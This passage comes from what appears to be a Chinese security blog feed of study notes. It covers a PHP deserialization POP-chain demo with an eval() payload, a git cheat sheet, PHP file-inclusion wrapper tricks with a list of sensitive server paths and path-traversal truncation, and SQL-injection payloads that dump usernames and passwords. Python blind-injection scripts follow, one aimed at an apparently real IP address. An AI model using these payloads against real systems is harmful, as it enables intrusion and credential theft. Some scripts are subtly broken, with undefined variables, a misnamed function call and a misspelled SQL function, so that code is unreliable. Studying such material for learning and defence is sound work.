class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ClassObj-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>分析如下：</p></li><li><p>可控点：unserilize()函数</p></li><li><p>在上面写的3个类中，当调用unserilize()函数时，只会发序列化lemon这个类，因为只有该类中有__destruct()函数，且该函数会调用normal类中的action()方法</p></li><li><p>敏感代码在哪？在evil类中的action()方法中，调用了eval()函数，可以执行php代码</p></li><li><p>思考点：如何通过反序列lemon类来调用eval类中的action方法。</p><p>思考过程：在原来的函数中<strong>destruct()函数new的是normol类，现在我们想调用的是evil类中的action()，那就把new的类换成evil，然后在后面unserilize()过程中，触发</strong>destruct()函数时，<code>$this-&gt;ClassObj-&gt;action()</code>指向的就是evil中的action()，实验一下</p><p>生成pop链</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lemon</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$ClassObj</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> evil();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span> = <span class="string">&quot;phpinfo()&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    var_dump(<span class="keyword">new</span> lemon());</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> serialize(<span class="keyword">new</span> lemon());</span><br></pre></td></tr></table></figure><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/Untitled12.png" alt="PHP%20a3faa3df2354433297591bd6cb36c882/Untitled%2012.png"></p></li><li><p><code>O:5:&quot;lemon&quot;:1:&#123;s:11:&quot;*ClassObj&quot;;O:4:&quot;evil&quot;:1:&#123;s:10:&quot;evildata&quot;;s:9:&quot;phpinfo()&quot;;&#125;&#125;</code></p><p>将这个值传给d，发现提示</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/Untitled13.png" alt="PHP%20a3faa3df2354433297591bd6cb36c882/Untitled%2013.png"></p><p>报了一个致命错误，为什么呢？？</p><p>因为！serialize在进行反序列化时，private、public、protected三个不同的属性，序列化出来的是有不同的，用python抓一下，此时，输出是这样的：O:5:”lemon”:1:{s:11:”\x00*\x00ClassObj”;O:4:”evil”:1:{s:10:”\x00evil\x00data”;s:10:”phpinfo();”;}}</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/Untitled14.png" alt="PHP%20a3faa3df2354433297591bd6cb36c882/Untitled%2014.png"></p></li><li><p>发现private属性的classobj前面增加了\x00*\x00</p></li><li><p>在private属性的data前增加了\x00\x00</p><p>在浏览器输出的时候不会显示出来，把他urlencode一下再输出后传给d，输出了我们想要的效果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A5%3A%22lemon%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A10%3A%22%00evil%00data%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D</span><br></pre></td></tr></table></figure><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/Untitled15.png" alt="PHP%20a3faa3df2354433297591bd6cb36c882/Untitled%2015.png"></p><p>这个小demo比较简单，主要涉及了两个类，实际情况中会更复杂.</p><h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>需要明白下面几点</p></li><li><p>什么是反序列化漏洞：相关人员利用可控的unserilize()输入，经过一系列剖析，构造pop链，从而达到敏感操作目的</p></li></ul></li><li><p>在使用serialize()函数和unserilize()函数时，相关魔法函数的调用顺序</p><ul><li>CVE-2016-7124的核心</li></ul></li><li><p>serialize()函数进行序列化时，不同属性序列化的区别</p><ul><li><p>什么是pop链，如何构造pop链</p><h2 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h2><p><a href="http://redteam.today/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/">http://redteam.today/2017/10/01/POP链学习/</a></p><p><a href="https://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html">https://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html</a></p><p><a href="https://xz.aliyun.com/t/378">https://xz.aliyun.com/t/378</a></p><p><a href="https://www.kingkk.com/2018/07/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://www.kingkk.com/2018/07/php反序列化漏洞/</a></p><p><a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://chybeta.github.io/2017/06/17/浅谈php反序列化漏洞/</a></p></li></ul></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;序列化与反序列化&quot;&gt;&lt;a href=&quot;#序列化与反序列化&quot; class=&quot;headerlink&quot; title=&quot;序列化与反序列化&quot;&gt;&lt;/a&gt;序列化与反序列化&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;序列化：在PHP中，序列化用于存储或传递 PHP 的值（比如数组或者类的值）的过程中，同时不丢失其类型和结构。就是将数组和类的值转换成字符串来传递。&lt;/li&gt;
&lt;li&gt;反序列化：将已经序列化的对象/数组的字符串还原成对象/数组格式。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt; 为什么要序列化？有利于存储或传递 PHP 的值，同时不丢失其类型和结构。&lt;/p&gt;</summary>
    
    
    
    
    <category term="安全" scheme="http://example.com/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>git笔记</title>
    <link href="http://example.com/2019/09/15/git%E7%AC%94%E8%AE%B0/"/>
    <id>http://example.com/2019/09/15/git%E7%AC%94%E8%AE%B0/</id>
    <published>2019-09-14T16:00:00.000Z</published>
    <updated>2021-10-25T05:11:45.682Z</updated>
    
    <content type="html"><![CDATA[<p>自查笔记</p><span id="more"></span><ul><li>创建分支/切换分支</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout [-b] 分支名</span><br></pre></td></tr></table></figure><ul><li>查看当前分支</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch</span><br></pre></td></tr></table></figure><ul><li>创建云端分支</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -u origin loginAndUser</span><br></pre></td></tr></table></figure><ul><li>合并分支</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git merge 分支名</span><br></pre></td></tr></table></figure><ul><li>将修改文件添加到缓存区</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br></pre></td></tr></table></figure><ul><li>提交代码</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m &quot;备注内容&quot;</span><br></pre></td></tr></table></figure><ul><li>删除分支</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -d 分支名</span><br></pre></td></tr></table></figure><ul><li>抓取远程仓库</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git pull</span><br><span class="line">git fetch</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;自查笔记&lt;/p&gt;</summary>
    
    
    
    
    <category term="git" scheme="http://example.com/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>文件包含学习</title>
    <link href="http://example.com/2019/08/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://example.com/2019/08/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2019-08-15T16:00:00.000Z</published>
    <updated>2021-10-25T05:14:26.261Z</updated>
    
    <content type="html"><![CDATA[<h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><ul><li><p>include()</p><ul><li>include(include_path)</li><li>作用：包含并指定include_path指定的文件，如果出错还会继续执行，生成一个警告 <span id="more"></span></li></ul><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200604195536497.png" alt="image-20200604195536497"></p></li><li><p>include_once()</p></li><li><p>作用：包含并运行指定文件，但是对于同一个文件只会包含一次</p></li><li><p>require()</p><ul><li>require(include_path)</li><li>包含并指定include_path指定的文件，<strong>如果出错会报错，不会再继续执行</strong></li></ul></li><li><p>require_once()</p><ul><li>和require类似，但是对于同一个文件只会包含一次</li></ul></li></ul><p>注意：以上四个包含文件的函数，对于包含的文件<strong>不管是什么类型，都会被当作PHP文件来执行</strong></p><p>require和include的区别：</p><ul><li>require：<strong>只要程序开始执行，则立即包含require指定的文件并执行</strong>，一般用来包含类文件、数据库等文件</li><li>include：只有执行的代码到include时，才会包含该指定的文件，一般用来包含html模板之类的文件</li></ul><h2 id="PHP伪协议文件包含"><a href="#PHP伪协议文件包含" class="headerlink" title="PHP伪协议文件包含"></a>PHP伪协议文件包含</h2><p><a href="https://www.php.net/manual/zh/wrappers.data.php">https://www.php.net/manual/zh/wrappers.data.php</a></p><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><ul><li>是个可以访问请求的原始数据的只读流,<strong>可以读取到post没有解析的原始数据, 将post请求中的数据作为PHP代码执行</strong>。因为它不依赖于特定的 php.ini 指令。</li><li><strong>注：enctype=”multipart/form-data” 的时候 php://input 是无效的。</strong></li><li>使用条件：allow_url_include = on</li><li>demo</li></ul><p>test.php中（后续对协议的测试都用此php进行）:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">   </span><br><span class="line">    include($file);</span><br><span class="line">    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200625152052819.png" alt="image-20200625152052819"></p><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><ul><li><p>作用：用选定的过滤器读/写入数据流</p></li><li><p>格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=过滤器名称(即数据流的加密方式)/resource=要读取/写入的链表</span><br></pre></td></tr></table></figure></li><li><p>例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64/resource=path //将path文件的内容经base64加密后输出</span><br><span class="line"></span><br><span class="line">//写入</span><br><span class="line">php://filter/write=convert.base64/resource=example.txt,&quot;hello world&quot;</span><br><span class="line"></span><br><span class="line">当需要多个过滤器时，以|分隔</span><br></pre></td></tr></table></figure><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200625151909775.png" alt="image-20200625151909775"></p></li></ul><p>更多参考<a href="https://www.php.net/manual/zh/wrappers.php.php">https://www.php.net/manual/zh/wrappers.php.php</a></p><h3 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h3><ul><li>条件：PHP &gt;= 5.3.0</li><li>访问一个压缩包中的子文件</li><li>路径可以绝对路径也可以相对路径</li></ul><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200625153748243.png" alt="image-20200625153748243"></p><h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h3><ul><li>条件：php &gt;= 5.3.0</li><li>访问一个压缩包中的子文件</li><li>格式：<strong>zip://archive.zip#dir/file.txt</strong></li></ul><h3 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h3><ul><li>条件：<ul><li>allow_url_open = on</li><li>allow_url_include = on</li><li>php &gt;= 5.2</li></ul></li><li>格式：<strong>data://资源类型,[编码];内容</strong></li></ul><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200625155859226.png" alt="image-20200625155859226"></p><h2 id="一些重要文件路径"><a href="#一些重要文件路径" class="headerlink" title="一些重要文件路径"></a>一些重要文件路径</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 日志文件</span></span><br><span class="line">/var/log/apache</span><br><span class="line">apache/logs/error.log</span><br><span class="line">apache/logs/access.log</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 读配置文件找日志路径</span></span><br><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line">/etc/init.d/httpd  </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> session文件  PHPSESSID与cookie中指定的PHPSESSID相对应</span></span><br><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSID</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 这两个文件存着所有文件的路径，需要root权限</span></span><br><span class="line">/var/lib/locate.db</span><br><span class="line">/var/lib/mlocate/mlocate.db</span><br></pre></td></tr></table></figure><h2 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h2><ul><li><p>绕过文件路径限制</p><ul><li>../进行拼接</li></ul></li><li><p>绕过../过滤</p><ul><li>编码<ul><li>URL编码</li><li>二次URL编码</li></ul></li></ul></li><li><p>绕过文件名后缀指定</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$file</span>.<span class="string">&#x27;/test/test.php&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>文件名后添加 # ，详情见dvwa-文件包含 medium关</p></li><li><p>ps：即如果在URL后加了#，后面的内容不会提交给服务器校验</p></li><li><p>绕过后缀 - 长度截断</p><ul><li><p>不停的增加../.././</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../../.../../.../../../../../../../../../../。。。。。。。/shell.txt</span><br></pre></td></tr></table></figure><p>在linux中达到4096字节，Windows中256字节时，会自动丢弃后面多余的部分</p></li></ul></li></ul><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ul><li>过滤敏感字符</li><li>设置open_basedir，指定可以进行包含的目录路径</li></ul><p><a href="https://www.cnblogs.com/iamstudy/articles/include_file.html">https://www.cnblogs.com/iamstudy/articles/include_file.html</a></p><p><a href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">https://chybeta.github.io/2017/10/08/php文件包含漏洞/</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;相关函数&quot;&gt;&lt;a href=&quot;#相关函数&quot; class=&quot;headerlink&quot; title=&quot;相关函数&quot;&gt;&lt;/a&gt;相关函数&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;include()&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;include(include_path)&lt;/li&gt;
&lt;li&gt;作用：包含并指定include_path指定的文件，如果出错还会继续执行，生成一个警告</summary>
    
    
    
    
    <category term="安全" scheme="http://example.com/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入总结</title>
    <link href="http://example.com/2019/07/25/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
    <id>http://example.com/2019/07/25/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</id>
    <published>2019-07-24T16:00:00.000Z</published>
    <updated>2021-10-25T05:13:12.221Z</updated>
    
    <content type="html"><![CDATA[<p>….</p><span id="more"></span><h3 id="回显注入"><a href="#回显注入" class="headerlink" title="回显注入"></a>回显注入</h3><ul><li>原理：web页面对后端返回的信息没做过滤，直接将数据库相关报错信息显示在页面上</li><li>一般性步骤<ol><li>利用点是否存在SQL 注入（恶意输入与正常输入页面做对比）</li><li>获取数据库类型、版本</li><li>判断数据表字段数<ul><li> order by</li></ul></li><li>判断回显位置<ul><li> union select</li></ul></li></ol></li></ul><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>以mysql为例：</p><ul><li>判断是否存在sql注入</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://test.com?id=1&#x27; // 报错语句</span><br><span class="line">http://test.com?id=1&#x27; or 1=1 -- -  //成功执行</span><br></pre></td></tr></table></figure><ul><li>判断字段数</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://test.com?id=1&#x27;  order by 3-- -</span><br><span class="line">http://test.com?id=1&#x27;  order by 4-- - //报错</span><br></pre></td></tr></table></figure><ul><li>判断回显位置</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com?id=-1&#x27; union select 1,2,3-- -</span><br></pre></td></tr></table></figure><ul><li>获取数据库版本</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com?id=-1&#x27;  union select 1,version(),3-- -</span><br></pre></td></tr></table></figure><ul><li>获取数据库名</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com?id=-1&#x27;  union select 1,database(),3-- -</span><br></pre></td></tr></table></figure><ul><li>获取数据表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com?id=-1&#x27;  union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3-- -</span><br></pre></td></tr></table></figure><ul><li>获取数据表的字段名</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com?id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3 -- -</span><br></pre></td></tr></table></figure><ul><li>获取用户名和密码</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com?id=-1&#x27; union select 1,(select group_concat(username) from users),(select group_concat(password) from users) -- -</span><br></pre></td></tr></table></figure><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><h4 id="主要函数"><a href="#主要函数" class="headerlink" title="主要函数"></a>主要函数</h4><ul><li>left(str,len)：获取参数str从最左边开始的前len个字符</li></ul><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200625114647126.png" alt="image-20200625114647126"></p><ul><li>ascii()：获取参数的ascii码</li><li>ord()：获取参数的ascii码</li></ul><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200625114449883.png" alt="image-20200625114449883"></p><ul><li><p>if(expr1,expr2,expr3)：</p><ul><li>expr1：判断条件</li><li>expr2：条件成立时返回的结果</li><li>expr3：条件不成立时返回的结果</li></ul><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200625114250808.png" alt="image-20200625114250808"></p></li><li><p>substr(str,pos,len)：从第pos个字符开始，截取len个字符</p></li></ul><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200625125524668.png" alt="image-20200625125524668"></p><h4 id="脚本实例"><a href="#脚本实例" class="headerlink" title="脚本实例"></a>脚本实例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">zidian = <span class="string">&#x27;sqwertyuioplkjhgfdsazxcvbnm789456123.0.,/][\;&#123;$%&amp;*()&#125;&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/sqli/Less-6/?id=1&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_dbname</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> zidian:</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(j)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#获取数据库名</span></span><br><span class="line">            payload = <span class="string">&#x27;http://127.0.0.1/sqli/Less-6/?id=1&quot; and if(ascii(substr((select database()),&#123;0&#125;,1))=&#123;1&#125;,1,0) -- -&#x27;</span>.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(j))</span><br><span class="line"></span><br><span class="line">            <span class="comment">#获取数据表名 控制limit获取其他表</span></span><br><span class="line">            <span class="comment">#payload = &#x27;http://127.0.0.1/sqli/Less-6/?id=1&quot; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),&#123;0&#125;,1))=&#123;1&#125;,1,0) -- -&#x27;.format(i,ord(j))</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment">#获取字段名</span></span><br><span class="line">            <span class="comment">#payload = &#x27;http://127.0.0.1/sqli/Less-6/?id=1&quot; and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;表名&#x27; limit 0,1),&#123;0&#125;,1))=&#123;1&#125;,1,0) -- -&#x27;.format(i,ord(j))</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">#获取字段值</span></span><br><span class="line">            <span class="comment">#payload = &#x27;http://127.0.0.1/sqli/Less-6/?id=1&quot; and if(ascii(substr((select column_name from 表名 limit 0,1),&#123;0&#125;,1))=&#123;1&#125;,1,0) -- -&#x27;.format(i,ord(j))</span></span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(payload)</span><br><span class="line">            flag = requests.get(payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> flag.text:</span><br><span class="line">                res += j</span><br><span class="line">                <span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get_res()</span><br></pre></td></tr></table></figure><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><h4 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h4><ul><li>sleep(x)：数据库沉睡x秒返回结果</li></ul><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200625113936372.png" alt="image-20200625113936372"></p><ul><li><p>benchark(expr1,expr2)：将expr2这个表达式执行expr1次</p><ul><li>benchmark(1000,md5(1))：将1进行MD5加密1000次</li></ul><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200625114006406.png" alt="image-20200625114006406"></p></li></ul><h4 id="脚本示例"><a href="#脚本示例" class="headerlink" title="脚本示例"></a>脚本示例</h4><ul><li>sleep</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">dbname = <span class="string">&#x27;&#x27;</span></span><br><span class="line">zidian=<span class="string">&quot;qwertyuiopasdfghjklzxcvbnm-_&#123;&#125;&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">7</span>):</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> zidian:</span><br><span class="line">    <span class="comment"># 修改此处获取数据表、字段等值</span></span><br><span class="line">    url=<span class="string">&quot;http://222.18.158.254:4609/?id=1 and if(asci(substr(database(),&#123;0&#125;,1))=&#x27;&#123;1&#125;&#x27;,sleep(5),1)&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(j),<span class="built_in">ord</span>(i))</span><br><span class="line">    <span class="comment"># t1 = time.time()</span></span><br><span class="line">    a=requests.get(url)</span><br><span class="line">    <span class="comment"># t2 = time.time()</span></span><br><span class="line">    <span class="comment"># total_time = t2 - t1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(a.elapsed.total_seconds()&gt;=<span class="number">5</span>):</span><br><span class="line">      <span class="built_in">print</span> url</span><br><span class="line">      <span class="built_in">print</span> <span class="string">&quot;succeess&quot;</span></span><br><span class="line">      </span><br><span class="line">      dbname = dbname+i</span><br><span class="line">      <span class="built_in">print</span> dbname</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> dbname</span><br></pre></td></tr></table></figure><ul><li>benchmark</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 